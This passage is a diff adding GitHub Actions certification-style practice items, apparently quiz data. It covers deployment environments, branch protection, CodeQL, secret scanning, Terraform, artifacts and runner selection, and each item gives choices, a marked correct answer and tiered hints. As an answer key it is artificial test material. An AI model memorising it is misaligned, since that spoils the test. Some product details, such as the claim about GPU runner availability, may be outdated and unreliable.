+          "label": "Complete Explanation",
+          "content": "A single workflow with three jobs connected via needs: creates the deployment pipeline. Each job specifies environment: staging/canary/production. The staging environment has no protection rules — deploys automatically on merge. The canary environment has a 10-minute wait timer — giving time to observe metrics before the next stage. The production environment requires reviewer approval — designated team members must click \"Approve\" before the full deployment proceeds. Each environment has its own secrets (KUBE_CONFIG, DATABASE_URL) that are only accessible in that environment's job. Rollback: a separate workflow_dispatch workflow can redeploy any previous version to any environment."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Environment protection rules: required reviewers (up to 6), wait timer (minutes), branch restrictions (only main can deploy to prod).</li>\n              <li>Deployment log: GitHub tracks which SHA is deployed to each environment — visible in the repository's Environments tab.</li>\n              <li>needs: creates the sequence — canary needs: [staging], full needs: [canary]. If any stage fails, subsequent stages don't run.</li>\n              <li>Rollback pattern: workflow_dispatch with inputs for version and environment, deploying a specific container tag/commit to the selected environment.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Deployment Pipeline",
+        "Environments",
+        "Approval Gates"
+      ]
+    },
+    {
+      "id": 27,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "Docker Container Action",
+      "scenario": "A team needs an action that runs a complex static analysis tool requiring specific OS packages (libclang, LLVM 15), Python 3.11, and custom C++ binaries that take 5 minutes to compile. The action must produce consistent results regardless of the runner's pre-installed tools. Build time for the Docker image is acceptable once but the action must start quickly on subsequent uses.",
+      "questionText": "Which action design ensures consistent environment with fast startup after initial build?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Docker container action with a pre-built image published to ghcr.io — action.yml references the pre-built image (image: 'docker://ghcr.io/org/analysis-tool:v1') instead of building from Dockerfile each run, providing consistent environment with fast pull-based startup"
+        },
+        {
+          "letter": "B",
+          "text": "JavaScript action with runtime dependency installation via apt-get in a setup step"
+        },
+        {
+          "letter": "C",
+          "text": "Composite action with run: steps installing all dependencies inline"
+        },
+        {
+          "letter": "D",
+          "text": "Docker action with Dockerfile that builds from scratch on every workflow run"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Pre-built Docker images on ghcr.io provide consistent environments with fast startup (just pull, no build) — reference via docker:// URI in action.yml."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "A Docker container action using a pre-built image (image: 'docker://ghcr.io/org/analysis-tool:v1' in action.yml) provides: consistent environment (specific OS packages, Python version, LLVM tools compiled into the image), fast startup (docker pull of a cached image vs. 5-minute compilation on each run), and reproducibility (same image tag = same analysis results every time). The image is built separately (via its own CI workflow on the action repository) and pushed to ghcr.io. Updates to the tool = new image build + new tag. This separates the expensive build from the runtime usage."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Docker action image options: 'Dockerfile' (build each run — slow), 'docker://image:tag' (pull pre-built — fast).</li>\n              <li>ghcr.io public images: pulled without authentication from any GitHub Actions runner — no secrets needed for consumption.</li>\n              <li>Layer caching: GitHub-hosted runners cache common base layers; subsequent pulls only download changed layers.</li>\n              <li>Limitation: Docker actions only work on Linux runners — not Windows or macOS. For cross-OS, use JavaScript or composite actions.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Docker Action",
+        "Container",
+        "Pre-built Image"
+      ]
+    },
+    {
+      "id": 28,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Branch Protection and Required Checks",
+      "scenario": "A repository's main branch must be protected: no direct pushes (all changes via PR), CI must pass before merge, at least 2 reviewers must approve, conversation threads must be resolved, the branch must be up-to-date with main before merging (no stale PRs), and force pushes and deletions must be blocked. Admins should not be able to bypass these rules.",
+      "questionText": "Which branch protection configuration enforces all these requirements without exceptions?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Repository ruleset with the same requirements applied at organization level"
+        },
+        {
+          "letter": "B",
+          "text": "CODEOWNERS file requiring 2 approvers for all files"
+        },
+        {
+          "letter": "C",
+          "text": "Branch protection rule with: require PR (minimum 2 approvals, dismiss stale reviews), require status checks (CI workflow, require branches to be up to date), require conversation resolution, restrict force push and deletion, and \"Do not allow bypassing\" enabled to include administrators"
+        },
+        {
+          "letter": "D",
+          "text": "Branch protection with admin bypass enabled for emergency situations"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Branch protection rules combine all the listed requirements — the key is \"Do not allow bypassing\" which makes rules apply to admins too."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Branch protection rule on main: \"Require a pull request before merging\" (enables PR requirement) with \"Required approving reviews: 2\" and \"Dismiss stale pull request approvals when new commits are pushed.\" \"Require status checks to pass\" with the CI workflow selected and \"Require branches to be up to date before merging\" checked. \"Require conversation resolution before merging\" ensures all threads are addressed. \"Restrict force pushes\" and \"Allow deletions\" unchecked blocks both. Finally, \"Do not allow bypassing the above settings\" (or checking \"Include administrators\") ensures even organization owners and repo admins cannot push directly or override the rules. This provides the strongest possible protection."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>\"Require branches to be up to date\": PRs must have the latest main merged in — prevents \"works on my branch but breaks when merged\" scenarios.</li>\n              <li>Dismiss stale reviews: when new commits are pushed to the PR, previous approvals are dismissed — reviewers must re-approve after changes.</li>\n              <li>Repository rulesets (newer feature): organization-level rules that apply across repositories — more powerful than per-repo branch protection.</li>\n              <li>CODEOWNERS: defines required reviewers per path — complements branch protection but doesn't replace it (CODEOWNERS needs branch protection's \"require review from Code Owners\" setting).</li></ul>"
+        }
+      ],
+      "tags": [
+        "Branch Protection",
+        "Required Checks",
+        "Security"
+      ]
+    },
+    {
+      "id": 29,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Organization-Level Workflow Governance",
+      "scenario": "An enterprise with 200 repositories needs organization-wide CI/CD governance: standardized workflows that all repos must use (security scanning, artifact signing), prevention of workflows that skip required security steps, audit trail of all workflow changes, and the ability to roll out workflow updates across all repositories without individual repo modifications.",
+      "questionText": "Which governance model provides organization-wide workflow standardization and enforcement?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Email all developers asking them to add security scanning to their workflows"
+        },
+        {
+          "letter": "B",
+          "text": "Block all workflow modifications and have a central team manage all 200 repositories' workflows"
+        },
+        {
+          "letter": "C",
+          "text": "A bot that opens PRs in each repository when workflows need updating"
+        },
+        {
+          "letter": "D",
+          "text": "Required workflows (organization rulesets) that automatically inject mandatory jobs into all repository workflows, combined with reusable workflows in the .github repository for standardized patterns, and audit log monitoring for workflow file changes via organization audit events"
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Required workflows (via rulesets) inject mandatory jobs that repositories cannot skip — combined with reusable workflows for voluntary standardization."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Organization-level repository rulesets can specify required workflows — these jobs are automatically appended to repository CI runs and must pass before merging. Repositories cannot skip or modify these required jobs. For example, a required security scan workflow runs on every PR across all 200 repos — even if the repo's own workflow doesn't include it. Reusable workflows in the .github organization repository provide standardized patterns that repos voluntarily adopt (uses: org/.github/...). The organization audit log tracks all workflow file changes (actions_workflow.created, actions_workflow.updated) for compliance. This provides both mandatory enforcement and voluntary standardization."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Required workflows via rulesets: apply to all repos matching the ruleset target (e.g., all repos, or repos matching name patterns).</li>\n              <li>Required workflows cannot be modified or skipped by repository contributors — they run as a separate check.</li>\n              <li>Audit log events: workflows.created_workflow_run, workflow_run.completed — exportable to SIEM for compliance tracking.</li>\n              <li>Starter workflows: .github/workflow-templates/ in the .github repo provides templates shown when repos create new workflows — voluntary adoption.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Governance",
+        "Organization",
+        "Required Workflows"
+      ]
+    },
+    {
+      "id": 30,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Error Handling and Retry Logic",
+      "scenario": "A deployment workflow calls an external API that occasionally returns 503 (service unavailable) during peak hours. The team needs: automatic retry of the API call (up to 3 attempts with 30-second intervals), a fallback action if all retries fail (notify the team via Slack), and the workflow should not mark the overall run as failed if the API call is non-critical (a notification step, not a deployment step).",
+      "questionText": "Which error handling pattern provides retry, fallback, and graceful failure handling?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "No error handling — let the workflow fail and re-run manually"
+        },
+        {
+          "letter": "B",
+          "text": "Use the nick-invision/retry action for automatic retry and handle fallback in a separate workflow"
+        },
+        {
+          "letter": "C",
+          "text": "Step with retry logic (bash loop with curl retries and sleep intervals), a subsequent step with if: failure() for the Slack fallback notification, and continue-on-error: true on the non-critical job to prevent overall workflow failure"
+        },
+        {
+          "letter": "D",
+          "text": "Add try-catch in the shell script and always exit 0 regardless of result"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Bash retry loops handle transient errors, if: failure() triggers fallback actions, and continue-on-error prevents non-critical failures from blocking the workflow."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The API call step uses a bash retry loop: for i in 1 2 3; do curl ... &amp;&amp; break || sleep 30; done. If all 3 attempts fail, the step exits non-zero. A subsequent step with if: steps.api_call.outcome == 'failure' sends a Slack notification (fallback action). Setting continue-on-error: true on the step (or job) means even if the step fails, it's treated as a success for workflow status purposes — the overall workflow remains green. This pattern handles: transient errors (retry), permanent failures (fallback notification), and graceful degradation (continue-on-error for non-critical steps)."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>steps.{id}.outcome: 'success' or 'failure' regardless of continue-on-error — use this for conditional logic. steps.{id}.conclusion reflects continue-on-error adjustment.</li>\n              <li>continue-on-error at step level: step status becomes success in conclusion even if outcome is failure. At job level: same effect for the entire job.</li>\n              <li>nick-invision/retry action: provides declarative retry configuration (max_attempts, retry_wait_seconds, command) — cleaner than bash loops.</li>\n              <li>timeout-minutes on steps prevents infinite hangs: if the API is unreachable, the step times out rather than blocking the runner.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Error Handling",
+        "Retry",
+        "Resilience"
+      ]
+    },
+    {
+      "id": 31,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Infrastructure as Code Deployment",
+      "scenario": "A team manages cloud infrastructure with Terraform. Their CI/CD needs: terraform plan on every PR (showing the proposed changes as a PR comment), terraform apply only on merge to main with manual approval for production, state locking to prevent concurrent applies, and drift detection (scheduled workflow comparing actual infrastructure to Terraform state).",
+      "questionText": "Which GitHub Actions workflow architecture implements safe Terraform CI/CD?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "PR workflow: terraform plan with output posted as PR comment (using github-script or terraform-pr-commenter). Main branch workflow: terraform apply within a production environment (required reviewer approval), with concurrency group preventing parallel applies. Scheduled workflow: terraform plan with -detailed-exitcode detecting drift and creating issues on changes."
+        },
+        {
+          "letter": "B",
+          "text": "Run terraform apply on every push to any branch for fast feedback"
+        },
+        {
+          "letter": "C",
+          "text": "Manual terraform apply from developer machines with state in local files"
+        },
+        {
+          "letter": "D",
+          "text": "Terraform Cloud for all operations with GitHub Actions only for triggers"
+        }
+      ],
+      "correctAnswer": "A",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Plan on PR (visibility), apply on main with approval (safety), concurrency group (prevent parallel applies), and scheduled drift detection (compliance)."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "PR workflow runs terraform plan and posts the output as a PR comment — reviewers see exactly what infrastructure changes will occur before approving. Main branch workflow runs terraform apply within a production environment (required reviewer approval gate before the job executes). Concurrency group (concurrency: terraform-apply, cancel-in-progress: false) ensures only one apply runs at a time — preventing state conflicts. A scheduled workflow runs terraform plan -detailed-exitcode weekly — exit code 2 means drift detected, triggering an issue or alert. Remote state backend (S3/GCS with DynamoDB/GCS locking) prevents concurrent state access across all sources."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>terraform plan -detailed-exitcode: 0 = no changes, 1 = error, 2 = changes detected — script can branch on exit code.</li>\n              <li>PR comment with plan: use actions/github-script to create/update a comment with the plan output formatted in a collapsible &lt;details&gt; block.</li>\n              <li>State locking: Terraform automatically locks state during operations — the CI concurrency group is additional protection at the workflow level.</li>\n              <li>OIDC for cloud auth: use GitHub OIDC to authenticate to AWS/GCP/Azure for Terraform operations — no stored credentials.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Terraform",
+        "Infrastructure as Code",
+        "GitOps"
+      ]
+    },
+    {
+      "id": 32,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "Action Versioning Strategy",
+      "scenario": "A widely-used action (1000+ consumers) needs to ship breaking changes (renamed input parameters, changed output format). The team must: communicate the breaking change clearly, give consumers time to migrate, maintain the old version for those who cannot migrate immediately, and ensure consumers on the old version still receive security patches. They follow semantic versioning.",
+      "questionText": "Which versioning strategy provides safe breaking change rollout for a widely-used action?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Push the breaking change to the existing v1 tag — all consumers get it immediately"
+        },
+        {
+          "letter": "B",
+          "text": "Create a new repository for v2 and archive the v1 repository"
+        },
+        {
+          "letter": "C",
+          "text": "Create a v2 major release (new tag v2 and v2.0.0), maintain v1 branch for security patches, update README with migration guide, and use GitHub Releases with \"breaking\" label to notify consumers via Dependabot PRs that suggest the v1→v2 upgrade"
+        },
+        {
+          "letter": "D",
+          "text": "Add the new parameters alongside old ones with deprecation warnings — never remove old parameters"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Major version (v1 → v2) signals breaking changes; maintain both versions; migration guide helps consumers transition at their own pace."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Semantic versioning for actions: v2 tag (floating major) and v2.0.0 tag (exact version) for the breaking change release. The v1 branch continues receiving security patches (backported fixes tagged as v1.x.y, with the v1 floating tag updated). README includes a clear migration guide (v1 input names → v2 input names, output format changes). GitHub Release notes describe the breaking changes prominently. Consumers pinned to @v1 continue working unaffected. Dependabot (configured to watch action versions) creates upgrade PRs in consumer repos showing the v1→v2 upgrade path with the migration guide linked. This gives 1000+ consumers a safe, self-paced migration path."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Floating major tags (v1, v2): action maintainers move these tags to the latest patch release. Consumers use @v1 for automatic patch updates.</li>\n              <li>Security backports: critical CVEs fixed on both v1 and v2 branches — consumers on v1 are not left vulnerable.</li>\n              <li>Deprecation timeline: announce v1 end-of-life date (6-12 months after v2 release) — gives consumers a deadline.</li>\n              <li>GitHub Marketplace: both v1 and v2 can coexist in the Marketplace — listing shows the latest version by default.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Versioning",
+        "Semver",
+        "Breaking Changes"
+      ]
+    },
+    {
+      "id": 33,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Code Scanning with CodeQL",
+      "scenario": "A security team mandates static analysis for all repositories. They need: automatic vulnerability detection in JavaScript, Python, and Go code on every PR and weekly full scans, custom queries that detect organization-specific anti-patterns (e.g., logging PII), results integrated into the PR review experience (annotations on specific lines), and tracking of vulnerability remediation over time.",
+      "questionText": "Which configuration provides comprehensive code scanning with custom rules and PR integration?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Third-party SAST tool running in a Docker container with results uploaded as artifacts"
+        },
+        {
+          "letter": "B",
+          "text": "CodeQL analysis workflow with: languages matrix (javascript, python, go), custom query packs for organization-specific patterns, SARIF upload for PR annotations and Security tab integration, and scheduled weekly full-repository scans for comprehensive coverage"
+        },
+        {
+          "letter": "C",
+          "text": "ESLint and pylint in CI with security-focused rule sets only"
+        },
+        {
+          "letter": "D",
+          "text": "Manual code review focused on security patterns by the security team"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "CodeQL provides semantic code analysis (not just pattern matching), custom query support, native PR annotations, and Security tab tracking — purpose-built for this scenario."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "CodeQL workflow with language matrix: [javascript, python, go] runs analysis for each language. Custom query packs (.ql files in the repository or a shared query pack) detect organization-specific patterns like PII logging — extending CodeQL's 2000+ built-in queries. Results upload as SARIF (Static Analysis Results Interchange Format), which GitHub displays as: PR annotations on specific code lines (inline review experience), entries in the Security tab &gt; Code scanning alerts (with alert lifecycle tracking), and dismissal/resolution tracking over time. Scheduled weekly scans (schedule trigger) catch vulnerabilities in code paths not touched by recent PRs."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>CodeQL is semantic analysis: understands data flow, taint tracking, and control flow — not just regex pattern matching.</li>\n              <li>Custom queries: written in QL (a logic programming language), can detect complex patterns like \"data flows from user input to SQL query without sanitization.\"</li>\n              <li>Query packs: shareable bundles of .ql files distributed via GitHub Packages — organization-wide custom rule distribution.</li>\n              <li>SARIF upload: any SAST tool outputting SARIF format can integrate with GitHub's Security tab — not limited to CodeQL.</li></ul>"
+        }
+      ],
+      "tags": [
+        "CodeQL",
+        "Code Scanning",
+        "SAST"
+      ]
+    },
+    {
+      "id": 34,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Larger Runners and Hardware Selection",
+      "scenario": "A game development team's CI builds large C++ projects (30 minutes on standard 2-core runners). They also need GPU-accelerated tests for their rendering engine and ARM builds for mobile platforms. Budget is limited — they want to use larger runners only for jobs that benefit from more resources, not for simple linting or documentation builds.",
+      "questionText": "Which runner strategy optimizes cost while providing specialized hardware where needed?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Use the largest available runner for all jobs to minimize total build time"
+        },
+        {
+          "letter": "B",
+          "text": "Standard runners (ubuntu-latest) for lint and docs jobs, GitHub-hosted larger runners (ubuntu-latest-16-cores) for C++ compilation, self-hosted GPU runners for rendering tests, and self-hosted ARM runners (or ARM-based larger runners) for mobile builds — each job specifies runs-on: matching its resource needs"
+        },
+        {
+          "letter": "C",
+          "text": "A single self-hosted runner with GPU and many cores handling all job types"
+        },
+        {
+          "letter": "D",
+          "text": "Split the C++ build into 30 parallel jobs on standard runners"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Match runner resources to job requirements: standard for light jobs, larger runners for compilation, specialized hardware (GPU, ARM) for specific needs."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "runs-on: per job selects the appropriate runner: ubuntu-latest (2-core, free tier) for linting and docs (fast, cheap). ubuntu-latest-16-cores (GitHub-hosted larger runner) for C++ compilation — 8x cores reduces 30 minutes to ~5 minutes, and the higher per-minute cost is offset by 6x fewer minutes. Self-hosted runners with GPUs for rendering tests (GitHub-hosted runners don't have GPUs). Self-hosted ARM runners or GitHub's ARM larger runners (ubuntu-latest-arm64) for mobile builds. Each job gets exactly the resources it needs — no waste on standard jobs, no bottlenecks on intensive jobs."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Larger runner pricing: 2-core = 1x, 4-core = 2x, 8-core = 4x, 16-core = 8x, 32-core = 16x, 64-core = 32x per minute.</li>\n              <li>Cost optimization: if 16-core finishes in 1/8 the time of 2-core, cost is the same — but wall-clock time is 8x faster.</li>\n              <li>GPU runners: not available as GitHub-hosted — must be self-hosted (on-premises or cloud instances with GPUs attached).</li>\n              <li>ARM runners: GitHub offers ubuntu-latest-arm64 as larger runners — useful for building ARM-native binaries without cross-compilation.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Larger Runners",
+        "Hardware Selection",
+        "Cost Optimization"
+      ]
+    },
+    {
+      "id": 35,
+      "categoryRef": "cat-workflows",
+      "difficulty": "intermediate",
+      "title": "Workflow Artifacts and Retention",
+      "scenario": "A CI pipeline produces: build artifacts (compiled binaries, 500MB, needed for deployment), test reports (JUnit XML + HTML coverage, 50MB, useful for PR review), and debug logs (full build trace, 2GB, only needed if the build fails). The team wants to minimize storage costs while keeping necessary artifacts available. Deployed artifacts must be retained for 90 days for compliance. Test reports should be visible in PR checks. Debug logs should only be uploaded on failure.",
+      "questionText": "Which artifact strategy balances retention, visibility, and cost?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Upload all artifacts with default 90-day retention regardless of type"
+        },
+        {
+          "letter": "B",
+          "text": "Store all artifacts in an external S3 bucket instead of GitHub Artifacts"
+        },
+        {
+          "letter": "C",
+          "text": "Don't upload any artifacts — rebuild from source when needed"
+        },
+        {
+          "letter": "D",
+          "text": "Build artifacts: upload with retention-days: 90 for compliance. Test reports: upload with retention-days: 7 and use dorny/test-reporter for PR check annotation. Debug logs: upload with if: failure() and retention-days: 3 (only needed for failure investigation). Total: only necessary artifacts stored for minimum required durations."
+        }
+      ],
+      "correctAnswer": "D",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Different artifacts have different retention needs — use retention-days to minimize storage, if: failure() for conditional upload, and test reporters for PR integration."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "Tiered artifact strategy: Build artifacts (500MB) with retention-days: 90 satisfies compliance — these are needed for deployment rollback and audit. Test reports (50MB) with retention-days: 7 provides a week to review PR results; dorny/test-reporter or EnricoMi/publish-unit-test-result-action parses JUnit XML and creates a PR check with inline test results and annotations. Debug logs (2GB) with if: failure() only upload when the build fails — saving 90% of the time this would be stored (only 1 in 10 runs fail). retention-days: 3 gives enough time to investigate before auto-cleanup. This minimizes the storage cost (GitHub charges for artifact storage above the free tier) while maintaining all necessary functionality."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Storage limits: GitHub Free = 500MB, Pro = 1GB, Team = 2GB, Enterprise = 50GB of artifact storage included.</li>\n              <li>retention-days: 1-90; organization admins can set maximum retention period that overrides higher values in workflows.</li>\n              <li>Test reporter actions: parse JUnit/NUnit/xUnit XML and create GitHub Checks with per-test pass/fail annotations on the PR.</li>\n              <li>Artifact v4 (actions/upload-artifact@v4): immutable artifacts, faster uploads, and support for multiple uploads to the same artifact name (merged).</li></ul>"
+        }
+      ],
+      "tags": [
+        "Artifacts",
+        "Retention",
+        "Test Reports"
+      ]
+    },
+    {
+      "id": 36,
+      "categoryRef": "cat-cicd",
+      "difficulty": "intermediate",
+      "title": "Database Migration in CI/CD",
+      "scenario": "A web application uses PostgreSQL with schema migrations managed by Flyway. The CI/CD pipeline must: validate migration scripts syntax on PR (without running against production), test migrations against a fresh database in CI (ensure they apply cleanly), apply migrations to staging before application deployment, and apply to production with a backup taken first and rollback capability if the application fails health checks after migration.",
+      "questionText": "Which CI/CD pipeline handles database migrations safely across environments?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Apply migrations manually via SSH before each deployment"
+        },
+        {
+          "letter": "B",
+          "text": "PR: Flyway validate (syntax check only). CI: service container (postgres) with Flyway migrate + application integration tests. Staging job: Flyway migrate against staging DB then deploy app. Production job: pg_dump backup step, Flyway migrate, deploy app, health check — if health check fails, Flyway undo (or restore from backup) and rollback app deployment."
+        },
+        {
+          "letter": "C",
+          "text": "Run all migrations in production directly on merge without testing"
+        },
+        {
+          "letter": "D",
+          "text": "Use ORM auto-migration in the application startup — no explicit migration management"
+        }
+      ],
+      "correctAnswer": "B",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Layer migration safety: validate in PR, test in CI with ephemeral DB, apply to staging first, then production with backup and rollback capability."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "The pipeline layers safety: PR workflow runs Flyway validate (checks SQL syntax and naming conventions without connecting to a real database). CI workflow uses a PostgreSQL service container (services: postgres: image: postgres:15) where Flyway migrate applies all migrations from scratch — proving they apply cleanly to an empty database, then runs integration tests. Staging deployment job runs Flyway migrate against the staging database, then deploys the application (tests the migration with real data patterns). Production deployment job: pg_dump creates a backup, Flyway migrate applies changes, app deploys, health check validates. If health check fails: restore the backup (psql &lt; backup.sql) and roll back the application to the previous version."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Service containers: containers running alongside the job (services: key in YAML) — accessible via localhost or service name.</li>\n              <li>Flyway validate: checks migration file checksums, naming format, and SQL syntax without applying — fast, no DB needed (or uses a temp DB).</li>\n              <li>pg_dump before migration: provides point-in-time recovery if migration succeeds but application is incompatible with new schema.</li>\n              <li>Forward-only migrations: if Flyway undo is not available, the backup/restore approach is the safe rollback path.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Database Migrations",
+        "Flyway",
+        "Service Containers"
+      ]
+    },
+    {
+      "id": 37,
+      "categoryRef": "cat-actions",
+      "difficulty": "intermediate",
+      "title": "GitHub Script Action",
+      "scenario": "A workflow needs to: query the GitHub API to find all open PRs with the \"ready-for-review\" label, add a comment to each PR with today's build status, remove the label after commenting, and create a summary issue listing all PRs that were processed. This requires multiple API calls with error handling and state management between calls.",
+      "questionText": "Which approach provides rich GitHub API interaction within a workflow step?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Multiple curl commands with GITHUB_TOKEN in Authorization headers and jq for JSON parsing"
+        },
+        {
+          "letter": "B",
+          "text": "A separate GitHub App with a webhook server processing events"
+        },
+        {
+          "letter": "C",
+          "text": "actions/github-script with inline JavaScript — provides an authenticated octokit client (github.rest.*), access to context (context.repo, context.payload), and full Node.js for logic, error handling, and iteration over API results"
+        },
+        {
+          "letter": "D",
+          "text": "GitHub CLI (gh) commands in a shell script step for each operation"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "actions/github-script provides an authenticated Octokit client with full JavaScript — ideal for complex multi-step API interactions within a workflow."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "actions/github-script runs inline JavaScript with pre-authenticated clients: github.rest.pulls.list() to query PRs with label filter, github.rest.issues.createComment() to add comments, github.rest.issues.removeLabel() to remove labels, and github.rest.issues.create() for the summary issue. The JavaScript environment supports: async/await for sequential API calls, try/catch for error handling, variables for state management between calls, loops for iterating over PR lists, and template literals for building comment bodies. The octokit client is pre-authenticated with GITHUB_TOKEN — no manual auth header management. This is far more maintainable than curl + jq for complex multi-step API workflows."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>github-script context: github (octokit client), context (event payload, repo info), core (setOutput, setFailed), io, exec — full toolkit access.</li>\n              <li>Pagination: github.paginate(github.rest.pulls.list, {...}) automatically handles multi-page API responses.</li>\n              <li>Return values: the script's return value becomes the step's output, accessible via steps.{id}.outputs.result.</li>\n              <li>Authentication: uses GITHUB_TOKEN by default; can pass a PAT via with: github-token for cross-repo operations.</li></ul>"
+        }
+      ],
+      "tags": [
+        "GitHub Script",
+        "API",
+        "Automation"
+      ]
+    },
+    {
+      "id": 38,
+      "categoryRef": "cat-security",
+      "difficulty": "intermediate",
+      "title": "Secrets Scanning and Prevention",
+      "scenario": "A developer accidentally committed an AWS access key to a public repository. The security team needs: automatic detection of committed secrets (API keys, tokens, passwords), prevention of secrets from being pushed in the first place (pre-receive hook equivalent), notification to the security team when secrets are detected, and automatic revocation of exposed credentials where possible.",
+      "questionText": "Which GitHub features provide comprehensive secret leak detection, prevention, and response?",
+      "choices": [
+        {
+          "letter": "A",
+          "text": "Manual code review focused on credential patterns in every PR"
+        },
+        {
+          "letter": "B",
+          "text": "Pre-commit hooks on developer machines scanning for patterns before commit"
+        },
+        {
+          "letter": "C",
+          "text": "GitHub Secret Scanning (detects 200+ credential patterns in pushed code and alerts repo admins), Push Protection (blocks pushes containing detected secrets before they reach the repository), partner program (auto-revokes exposed tokens via provider notification to AWS/Azure/etc.), and security alerts routed to the security team via organization audit log streaming"
+        },
+        {
+          "letter": "D",
+          "text": "Repository settings preventing pushes to main — secrets can still be pushed to feature branches"
+        }
+      ],
+      "correctAnswer": "C",
+      "hints": [
+        {
+          "level": 1,
+          "label": "Brief Hint",
+          "content": "Secret scanning detects after push, push protection blocks before landing, partner program auto-revokes exposed tokens — comprehensive leak lifecycle management."
+        },
+        {
+          "level": 2,
+          "label": "Complete Explanation",
+          "content": "GitHub Secret Scanning automatically scans all pushes for 200+ credential patterns (AWS keys, GitHub tokens, database connection strings, etc.) and creates alerts in the Security tab. Push Protection (enabled per-repository or organization-wide) blocks the push entirely if a secret is detected — the developer sees an error message explaining what was detected and how to fix it. The partner program automatically notifies credential providers (AWS, Azure, Stripe, etc.) who revoke the exposed credential — limiting the window of exploitation. Security alerts from secret scanning can be routed to the security team via webhooks, audit log streaming, or notification settings. This covers prevention, detection, and response."
+        },
+        {
+          "level": 3,
+          "label": "Deep Knowledge",
+          "content": "<ul><li>Push protection bypass: developers can mark as false positive, used in tests, or will fix later — all bypasses are logged and visible to admins.</li>\n              <li>Partner program: 100+ partners including AWS, Azure, GCP, npm, PyPI, Slack — tokens are auto-revoked within minutes of exposure.</li>\n              <li>Custom patterns: organization admins can define custom secret patterns (regex) for internal credential formats not covered by built-in detection.</li>\n              <li>Secret scanning for non-provider patterns: detects generic patterns like passwords in connection strings and private keys — broader than just API keys.</li></ul>"
+        }
+      ],
+      "tags": [
+        "Secret Scanning",
+        "Push Protection",
+        "Credential Management"
+      ]
+    },
+    {
+      "id": 39,
+      "categoryRef": "cat-admin",
+      "difficulty": "intermediate",
+      "title": "Workflow Observability",
